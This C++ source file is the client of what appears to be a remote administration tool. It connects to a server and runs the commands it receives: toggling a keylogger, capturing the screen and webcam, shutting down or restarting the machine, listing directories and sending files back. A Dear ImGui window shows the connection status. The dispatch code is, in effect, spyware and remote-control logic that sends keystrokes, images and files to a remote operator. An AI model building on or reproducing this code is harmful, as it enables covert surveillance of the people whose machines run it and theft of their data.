
#define UNICODE

#include <bits/stdc++.h>

#include <imgui.h>
#include <imgui_impl_dx9.h>
#include <imgui_impl_win32.h>
#include <d3d9.h>

#include "PeerConnection.hpp"
#include "ThreadWrapper.hpp"
#include "ImGuiStdString.hpp"
#include "ImGuiScrollableText.hpp"
#include "Message.hpp"
#include "InternalUtilities.hpp"
#include "Engine.hpp"

#define DEFAULT_PORT 62300

std::mutex socketMutex;

std::string inputBuffer;

GuiScrollableTextDisplay miniConsole;

int MessageExecute(const Message& inputMessage, Message& outputMessage);

class ServerConnection : public PeerConnection {
public:
    std::atomic<bool> connecting{false};

    bool connectToServer(const std::string& address = "127.0.0.1", uint16_t port = DEFAULT_PORT) {
        if (connecting.load() || active.load()) return false;

        connecting.store(true);

        std::lock_guard<std::mutex> lock(socketMutex);
        int newSocket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (newSocket == -1) {
            connecting.store(false);
            return false;
        }

        // Set socket options
        int reuse = 1;
        setsockopt(newSocket, SOL_SOCKET, SO_REUSEADDR, 
                  reinterpret_cast<const char*>(&reuse), sizeof(reuse));

        sockaddr_in sa;
        memset(&sa, 0, sizeof(sa));
        sa.sin_family = AF_INET;
        sa.sin_port = htons(port);
        inet_pton(AF_INET, address.c_str(), &sa.sin_addr);

        if (connect(newSocket, reinterpret_cast<sockaddr*>(&sa), sizeof(sa)) == -1) {
            closesocket(newSocket);
            connecting.store(false);
            return false;
        }

        socketfile.store(newSocket);
        connecting.store(false);
        peerIp = address;
        peerPort = port;
        connectionTime = std::chrono::system_clock::now();
        funcStruct.reset();
        active.store(true);

        // Start listener thread
        std::thread([this]() {
            listenToServer();
        }).detach();

        return sendPublicKey();
    }

    void disconnect() {
        PeerConnection::disconnect();

        connecting.store(false);
        miniConsole.AddLineInfo("Self-disconnected");

        //Stop all running engine
        KeyloggerEngine::getInstance().shouldStop();
    }

private:
    void listenToServer() {
        while (active.load()) {
            auto status = receiveData();
            switch (status) {
                case ReceiveStatus::Success: {
                    Message msg;
                    if (processCompleteMessage(msg)) {
                        std::thread([msg, this]() {
                            Message outMsg;
                            if (MessageExecute(msg, outMsg)) {
                                miniConsole.AddLineSuccess("Successfully execute message");
                            } else {
                                miniConsole.AddLineError("Failed to execute message");
                            }
                            if(this->sendData(outMsg)) {
                                miniConsole.AddLineSuccess("Successfully sent output message");
                            } else {
                                miniConsole.AddLineSuccess("Failed to sent output message");
                            }
                        }).detach();
                    } else {
                        miniConsole.AddLineError("Failed to process message");
                    }
                    break;
                }
                case ReceiveStatus::KeyExchange:
                    miniConsole.AddLineSuccess("Successfully exchange key");
                    break;
                case ReceiveStatus::PeerDisconnected:
                    miniConsole.AddLineWarning("Disconnected from server");
                    break;
                case ReceiveStatus::NeedMoreData:
                    // Wait for more data
                    std::this_thread::sleep_for(std::chrono::milliseconds(10));
                    break;
                case ReceiveStatus::Error:
                    break;
            }
        }
    }
};

ServerConnection connectionManager;

int MessageExecute(const Message& inputMessage, Message& outputMessage) {
    int command = inputMessage.commandNumber;
    switch(command) {
        case MessageRawText: {
            connectionManager.funcStruct.rawText = std::string(inputMessage.getBinaryData(), inputMessage.getBinaryDataSize());
            return 1;
            //do not send back;
        }
        case MessageEnableKeylog: {
            if(EnableKeyloggerHandler(inputMessage, outputMessage)) {
                connectionManager.funcStruct.isKeyloggerActive = true;
                return 1;
            } else {
                connectionManager.funcStruct.isKeyloggerActive = false;
                return 0;
            }
        }
        case MessageDisableKeylog: {
            if(DisableKeyloggerHandler(inputMessage, outputMessage)) {
                connectionManager.funcStruct.isKeyloggerActive = false;
                return 1;
            } else {
                connectionManager.funcStruct.isKeyloggerActive = true;
                return 0;
            }
        }
        case MessageScreenCap: {
            if(ScreenCapHandler(inputMessage, outputMessage)) {
                miniConsole.AddLineInfo("Screen captured");
                return 1;
            } else {
                miniConsole.AddLineError("CAn't capture screen");
                return 0;
            }
        }
        case MessageInvokeWebcam: {
            connectionManager.funcStruct.isWebcamActive = true;
            int status = InvokeWebcamHandler(inputMessage, outputMessage);
            if(status) {
                miniConsole.AddLineInfo("Webcam captured. Woo!");
            } else {
                miniConsole.AddLineError("CAn't capture webcam");
            }
            connectionManager.funcStruct.isWebcamActive = false;
            return status;
        }
        case MessageShutdownMachine: {
            (void) ShutdownEngine(inputMessage, outputMessage);
            return true;
        }
        case MessageRestartMachine: {
            (void) RestartEngine(inputMessage, outputMessage);
            return true;
        }
        case MessageListFile: {
            int status = ListFilehandler(inputMessage, outputMessage);
            if(status) {
                miniConsole.AddLineInfo("Listing directory");
            } else {
                miniConsole.AddLineError("CAn't Listing directory");
            }
            return status;
        }
        case MessageGetFile: {
            int status = GetFileHandler(inputMessage, outputMessage);
            if(status) {
                miniConsole.AddLineInfo("Get file");
            } else {
                miniConsole.AddLineError("CAn't Get file");
            }
            return status;
        }
        
        default: break;
    }
    return 0;
}

void RunGui() {
    ImGuiIO& io = ImGui::GetIO(); (void)io;

    ImGui::Begin("Client", nullptr, ImGuiWindowFlags_None);
    
    ImGui::SeparatorText("Connection Status");
    if (connectionManager.isActive()) {
        ImGui::TextColored(ImVec4(0, 1, 0, 1), "Status: Connected");
        if (ImGui::Button("Disconnect")) {
            std::thread([] {
                connectionManager.disconnect();
            }).detach();
        }
    } else if (connectionManager.connecting.load()) {
        ImGui::TextColored(ImVec4(1, 1, 0, 1), "Status: Connecting...");
        if (ImGui::Button("Cancel")) {
            connectionManager.disconnect();
        }
    } else {
        static char ipAddressBuffer[64] = "127.0.0.1";
        static int portNumber = DEFAULT_PORT;
        ImGui::TextColored(ImVec4(1, 0, 0, 1), "Status: Disconnected");
        ImGui::Text("IP Address:");
        ImGui::SameLine();
        if (ImGui::InputText("##IP", ipAddressBuffer, sizeof(ipAddressBuffer))) {
            
        }
        ImGui::Text("Port:");
        ImGui::SameLine();

        if (ImGui::InputInt("##Port", &portNumber)) {
            portNumber = std::max(1024, std::min(portNumber, 65535));
        }

        if (ImGui::Button("Connect")) {
            std::thread([] {
                if (connectionManager.connectToServer(std::string(ipAddressBuffer), portNumber)) {
                }
            }).detach();
        }
    }

    if (connectionManager.isActive()) {
        ImGui::SeparatorText("Raw messages received");
        if (ImGui::BeginChild("GuiRawMessages", ImVec2(-1, 150), true)) {
            ImGui::TextWrapped("%s", connectionManager.funcStruct.rawText.c_str());
            if (ImGui::GetScrollY() >= ImGui::GetScrollMaxY()) {
                ImGui::SetScrollHereY(1.0f);
            }
        }
        ImGui::EndChild();
        //Clear button
        if (ImGui::Button("Clear Messages")) {
            connectionManager.funcStruct.rawText = "";
        }

        ImGui::BeginDisabled();
        ImGui::Checkbox("IsKeylogger", &connectionManager.funcStruct.isKeyloggerActive);
        ImGui::Checkbox("IsWebcam", &connectionManager.funcStruct.isWebcamActive);
        ImGui::EndDisabled();
    }
    ImGui::SeparatorText("Console");
    miniConsole.Draw();

    ImGui::End();
}

/////////////////////////////////////////////////////////////////////////////

static LPDIRECT3D9              g_pD3D = nullptr;
static LPDIRECT3DDEVICE9        g_pd3dDevice = nullptr;
static bool                     g_DeviceLost = false;
static UINT                     g_ResizeWidth = 0, g_ResizeHeight = 0;
static D3DPRESENT_PARAMETERS    g_d3dpp = {};

// Forward declarations of helper functions
bool CreateDeviceD3D(HWND hWnd);
void CleanupDeviceD3D();
void ResetDevice();
LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, WCHAR *lpCmdLine, int nCmdShow) {
    UNREFERENCED_PARAMETER(hInstance);
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);
    UNREFERENCED_PARAMETER(nCmdShow);
    //Attach console for debugging
    
    /*
    if (AttachConsole(ATTACH_PARENT_PROCESS) || AllocConsole()) {
        freopen("CONOUT$", "w", stdout);
        freopen("CONOUT$", "w", stderr);
    }
    */

    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;

    // Initialize GDI+
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    
    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed: " << WSAGetLastError() << std::endl;
        return 1;
    }

    //Setup GUI
    /////////////////////////////////////////////////////

    // Make process DPI aware and obtain main monitor scale
    ImGui_ImplWin32_EnableDpiAwareness();
    float main_scale = ImGui_ImplWin32_GetDpiScaleForMonitor(::MonitorFromPoint(POINT{ 0, 0 }, MONITOR_DEFAULTTOPRIMARY));

    // Create application window
    WNDCLASSEXW wc = { sizeof(wc), CS_CLASSDC, WndProc, 0L, 0L, GetModuleHandle(nullptr), nullptr, nullptr, nullptr, nullptr, L"ImGui Example", nullptr };
    ::RegisterClassExW(&wc);
    HWND hwnd = ::CreateWindowW(wc.lpszClassName, L"Dear ImGui DirectX9 Example", WS_OVERLAPPEDWINDOW, 100, 100, (int)(1280 * main_scale), (int)(800 * main_scale), nullptr, nullptr, wc.hInstance, nullptr);

    // Initialize Direct3D
    if (!CreateDeviceD3D(hwnd))
    {
        CleanupDeviceD3D();
        ::UnregisterClassW(wc.lpszClassName, wc.hInstance);
        return 1;
    }

    // Show the window
    ::ShowWindow(hwnd, SW_SHOWDEFAULT);
    ::UpdateWindow(hwnd);

    // Setup Dear ImGui context
    IMGUI_CHECKVERSION();
    ImGui::CreateContext();
    ImGuiIO& io = ImGui::GetIO(); (void)io;
    io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;
    io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad;
    io.IniFilename = nullptr;

    // Setup Dear ImGui style
    ImGui::StyleColorsDark();

    // Setup Platform/Renderer backends
    ImGui_ImplWin32_Init(hwnd);
    ImGui_ImplDX9_Init(g_pd3dDevice);

    ImVec4 clear_color = ImVec4(0.45f, 0.55f, 0.60f, 1.00f);

    // Main loop
    bool done = false;
    while (!done)
    {
        // Poll and handle messages (inputs, window resize, etc.)
        // See the WndProc() function below for our to dispatch events to the Win32 backend.
        MSG msg;
        while (::PeekMessage(&msg, nullptr, 0U, 0U, PM_REMOVE))
        {
            ::TranslateMessage(&msg);
            ::DispatchMessage(&msg);
            if (msg.message == WM_QUIT)
                done = true;
        }
        if (done)
            break;

        // Handle lost D3D9 device
        if (g_DeviceLost) {
            HRESULT hr = g_pd3dDevice->TestCooperativeLevel();
            if (hr == D3DERR_DEVICELOST) {
                ::Sleep(10);
                continue;
            }
            if (hr == D3DERR_DEVICENOTRESET) ResetDevice();
            g_DeviceLost = false;
        }

        // Handle window resize (we don't resize directly in the WM_SIZE handler)
        if (g_ResizeWidth != 0 && g_ResizeHeight != 0)
        {
            g_d3dpp.BackBufferWidth = g_ResizeWidth;
            g_d3dpp.BackBufferHeight = g_ResizeHeight;
            g_ResizeWidth = g_ResizeHeight = 0;
            ResetDevice();
        }

        // Start the Dear ImGui frame
        ImGui_ImplDX9_NewFrame();
        ImGui_ImplWin32_NewFrame();
        ImGui::NewFrame();

        RunGui();

        // Rendering
        ImGui::EndFrame();
        g_pd3dDevice->SetRenderState(D3DRS_ZENABLE, FALSE);
        g_pd3dDevice->SetRenderState(D3DRS_ALPHABLENDENABLE, FALSE);
        g_pd3dDevice->SetRenderState(D3DRS_SCISSORTESTENABLE, FALSE);
        D3DCOLOR clear_col_dx = D3DCOLOR_RGBA((int)(clear_color.x*clear_color.w*255.0f), (int)(clear_color.y*clear_color.w*255.0f), (int)(clear_color.z*clear_color.w*255.0f), (int)(clear_color.w*255.0f));
        g_pd3dDevice->Clear(0, nullptr, D3DCLEAR_TARGET | D3DCLEAR_ZBUFFER, clear_col_dx, 1.0f, 0);
        if (g_pd3dDevice->BeginScene() >= 0)
        {
            ImGui::Render();
            ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());
            g_pd3dDevice->EndScene();
        }
        HRESULT result = g_pd3dDevice->Present(nullptr, nullptr, nullptr, nullptr);
        if (result == D3DERR_DEVICELOST) g_DeviceLost = true;
    }

    // Cleanup
    ImGui_ImplDX9_Shutdown();
    ImGui_ImplWin32_Shutdown();
    ImGui::DestroyContext();

    CleanupDeviceD3D();
    ::DestroyWindow(hwnd);
    ::UnregisterClassW(wc.lpszClassName, wc.hInstance);


    ////////////////////////////////////////////////////////////

    connectionManager.disconnect();

    WSACleanup();
    Gdiplus::GdiplusShutdown(gdiplusToken);
    return 0;
}

/////////////////////////////
//Helper

bool CreateDeviceD3D(HWND hWnd)
{
    if ((g_pD3D = Direct3DCreate9(D3D_SDK_VERSION)) == nullptr)
        return false;

    // Create the D3DDevice
    ZeroMemory(&g_d3dpp, sizeof(g_d3dpp));
    g_d3dpp.Windowed = TRUE;
    g_d3dpp.SwapEffect = D3DSWAPEFFECT_DISCARD;
    g_d3dpp.BackBufferFormat = D3DFMT_UNKNOWN; // Need to use an explicit format with alpha if needing per-pixel alpha composition.
    g_d3dpp.EnableAutoDepthStencil = TRUE;
    g_d3dpp.AutoDepthStencilFormat = D3DFMT_D16;
    g_d3dpp.PresentationInterval = D3DPRESENT_INTERVAL_ONE;           // Present with vsync
    if (g_pD3D->CreateDevice(D3DADAPTER_DEFAULT, D3DDEVTYPE_HAL, hWnd, D3DCREATE_HARDWARE_VERTEXPROCESSING, &g_d3dpp, &g_pd3dDevice) < 0)
        return false;

    return true;
}

void CleanupDeviceD3D()
{
    if (g_pd3dDevice) { g_pd3dDevice->Release(); g_pd3dDevice = nullptr; }
    if (g_pD3D) { g_pD3D->Release(); g_pD3D = nullptr; }
}

void ResetDevice()
{
    ImGui_ImplDX9_InvalidateDeviceObjects();
    HRESULT hr = g_pd3dDevice->Reset(&g_d3dpp);
    if (hr == D3DERR_INVALIDCALL)
        IM_ASSERT(0);
    ImGui_ImplDX9_CreateDeviceObjects();
}

// Forward declare message handler from imgui_impl_win32.cpp
extern IMGUI_IMPL_API LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);

LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    if (ImGui_ImplWin32_WndProcHandler(hWnd, msg, wParam, lParam))
        return true;

    switch (msg)
    {
    case WM_SIZE:
        if (wParam == SIZE_MINIMIZED)
            return 0;
        g_ResizeWidth = (UINT)LOWORD(lParam); // Queue resize
        g_ResizeHeight = (UINT)HIWORD(lParam);
        return 0;
    case WM_SYSCOMMAND:
        if ((wParam & 0xfff0) == SC_KEYMENU) // Disable ALT application menu
            return 0;
        break;
    case WM_DESTROY:
        ::PostQuitMessage(0);
        return 0;
    }
    return ::DefWindowProcW(hWnd, msg, wParam, lParam);
}